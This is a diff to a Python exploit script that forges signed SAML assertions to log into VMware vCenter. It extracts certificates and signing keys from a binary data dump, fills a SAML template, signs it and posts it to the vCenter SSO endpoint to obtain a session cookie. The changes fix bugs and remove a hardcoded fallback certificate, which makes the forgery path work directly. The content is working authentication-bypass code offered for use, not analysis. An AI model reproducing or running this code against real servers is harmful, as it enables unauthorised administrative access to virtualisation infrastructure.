@@ -159,6 +159,7 @@ def get_trusted_cert1(stream, verbose=False):
     #if matches:
     #    for match in matches:
     stream.pos = 64753856
+    match = stream.pos
     if verbose:
         print(f'[!] Looking for cert 1 at position: {match}')
 
@@ -293,7 +294,7 @@ def login(vcenter, saml_resp):
     """Log in to the vCenter web UI using the signed response and return a session cookie"""
     try:
         print('[*] Attempting to log into vCenter with the signed SAML request')
-        resp = etree.tostring(s, xml_declaration=True, encoding="UTF-8", pretty_print=False)
+        resp = etree.tostring(saml_resp, xml_declaration=True, encoding="UTF-8", pretty_print=False)
         r = requests.post(
             f"https://{vcenter}/ui/saml/websso/sso",
             allow_redirects=False,
@@ -346,32 +347,8 @@ if __name__ == '__main__':
     in_stream = open(argspath, 'rb')
     bin_stream = bitstring.ConstBitStream(in_stream)
     idp_certs = get_idp_cert(bin_stream, argsverbose)
-    try:
-        trusted_cert_1, domain = get_trusted_cert1(bin_stream, argsverbose)
-    except:
-        domain = 'vsphere.local'
-        trusted_cert_1 = \
-"""-----BEGIN CERTIFICATE-----
-MIIDfDCCAmSgAwIBAgIJAOqPO5mnqRnRMA0GCSqGSIb3DQEBCwUAMG0xCzAJBgNV
-BAMMAkNBMRcwFQYKCZImiZPyLGQBGRYHdnNwaGVyZTEVMBMGCgmSJomT8ixkARkW
-BWxvY2FsMQswCQYDVQQGEwJVUzEhMB8GA1UECgwYcm96dmF2YzAxLnJvemF2ZXJl
-LmxvY2FsMB4XDTE2MDIxODE2NDIwNVoXDTI2MDIxMjE2NTE1MVowGDEWMBQGA1UE
-AwwNc3Nvc2VydmVyU2lnbjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
-AL+ot5Bn+1ydMVFCwoeKjkbCoJosZONISiR+JZmO4AHTMgeKi9kqmGA6EvBS60jk
-+pSjyZs6TL6i6iUftkBCci+OC6+glExx3/ukrOZeesLsFY26u8vsOoOHBOFyukkp
-SrskUKM842nhyFt9X0KeEP3E4gCkLZLLncdw3XS7YYdMo3cNbYHY4aby+YsX47Ue
-mDylHIXiJ8DAx2Pt243crC7b0ypRVoSPkX8sqSB1NOoWswD33vBSu/TO68fUkazD
-PtDPnIJcRK0eZJzHKONpjcsgdtWIHktewqzWmhJaTNJkAZcCspoPcc3MVoroy+6m
-Z3bQljs5fd8q/D62+7P5YCUCAwEAAaN0MHIwCwYDVR0PBAQDAgXgMCMGA1UdEQQc
-MBqCGHJvenZhdmMwMS5yb3phdmVyZS5sb2NhbDAdBgNVHQ4EFgQU1k/Fr+O9hcOE
-ROdZI9zkvDC5k5QwHwYDVR0jBBgwFoAUYReCjsiKEBa9IkDhTuVTF8NwiVYwDQYJ
-KoZIhvcNAQELBQADggEBAA/2yvB04SJ4nSTrqs89IEYc5EuOgnMsB3u9NouHgE3f
-KI+8lzi6lA08rFFg9cyxIVjycRiY+W3EaxqMRoJCnALI6fBu/YO0Pgx5UFu2m4sj
-gCYz7QW+v/4kCe+gIxTJFo1chKIC9jEdmSH4XACcVXQdX0ivKPEj/enMra34P1dp
-3mRPKXpTGNXChObo+FTnvSi0CZYCWg2A5sazCFLSMZ/WIk9AOFYCB2mXHE34s9gT
-gb/A2/buhA3KmzaYqNtKuNOuof6USiTpODLSmG7FbleL441Yry/B556G/y9y95xz
-ywn2KYen0leh9jHsJBtoLXs0s95wNkmHm4kGbI5SjwM=
------END CERTIFICATE-----"""
+    trusted_cert_1, domain = get_trusted_cert1(bin_stream, argsverbose)
+ 
     trusted_cert_2 = get_trusted_cert2(bin_stream, argsverbose)
     
 
@@ -381,16 +358,7 @@ ywn2KYen0leh9jHsJBtoLXs0s95wNkmHm4kGbI5SjwM=
     hostname = get_hostname(argstarget)
     req = saml_request(argstarget)
     t = fill_template(hostname, argstarget, domain,req)
-    for idp_cert in idp_certs:
-        try:
-            s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
-        except:
-            print(f'[-] Private key not working')
-    if s:
-        c = login(argstarget, s)
-    else:
-        print(f'[-] Failed to sigh assertion')
-        sys.exit()
-    
+    s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_certs[1])
+    c = login(argstarget, s)
 
 
